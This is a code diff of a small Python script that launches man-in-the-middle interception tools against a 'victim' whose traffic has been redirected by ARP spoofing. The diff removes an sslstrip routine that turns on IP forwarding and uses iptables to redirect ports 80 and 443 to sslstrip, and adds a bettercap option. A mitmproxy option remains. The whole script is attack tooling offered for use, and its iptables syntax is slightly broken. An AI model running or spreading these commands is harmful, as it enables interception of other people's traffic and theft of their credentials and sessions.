@@ -2,7 +2,6 @@
 #!usr/bin/env python3
 import os
 import mitmproxy
-import sslstrip
 
 header = """
                                                           ---------|
@@ -16,6 +15,7 @@ header = """
 
 print(header)
 
+
 print("[+] Firstly Make sure that victim's all traffic should be passing through attackers by arp.py script ")
 
 def mitmpr():
@@ -26,19 +26,17 @@ def mitmpr():
     os.system("sudo mitmproxy -T --host -e")
 
 
-def sslstrp():
-    os.system("sudo sysctl -w net.ipv4.ip_forward=1")
-    os.system("iptables -t nat -A PREROUTING -p TCP - -destination-port 80 -j REDIRECT --to-port 8080")
-    os.system("iptables -t nat -A PREROUTING -p TCP - -destination-port 443 -j REDIRECT --to-port 8080")
-    os.system("sslstrip -l 8080")
+def bettercap():
+    print("[+] Install requirements before running it from install.sh")
+    os.system("sudo bettercap -X")
 
 
-a = input("Which tool doyou ant to use [A. mitmproxy] or [B. Sslstrip]: (A/B)")
+a = input("Which tool doyou ant to use [A. mitmproxy] or [B. Bettercap]: (A/B)")
 
 if(a == 'A' or a == 'a'):
     mitmpr()
 elif(a == 'B' or a == 'b'):
-    sslstrp()
+    bettercap()
 else:
     print("Wrong input")
 
